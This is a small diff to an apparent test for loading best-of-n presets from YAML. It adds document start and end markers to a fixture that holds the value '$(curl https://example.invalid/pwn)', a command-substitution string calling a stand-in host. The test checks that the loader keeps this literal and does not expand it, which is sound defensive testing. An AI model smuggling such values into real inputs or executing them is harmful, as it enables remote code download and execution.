@@ -95,6 +95,7 @@ test("loadBestOfNPresetCatalog parses static YAML presets without expanding lite
 		writeFileSync(
 			join(cwd, ".pi", "best-of-n-presets.yaml"),
 			[
+				"---",
 				"presets:",
 				"  yamlPreset:",
 				"    description: \"literal $(curl https://example.invalid/pwn)\"",
@@ -105,6 +106,7 @@ test("loadBestOfNPresetCatalog parses static YAML presets without expanding lite
 				"        count: 2",
 				"    reviewers:",
 				"      - agent: reviewer",
+				"...",
 				"",
 			].join("\n"),
 		);
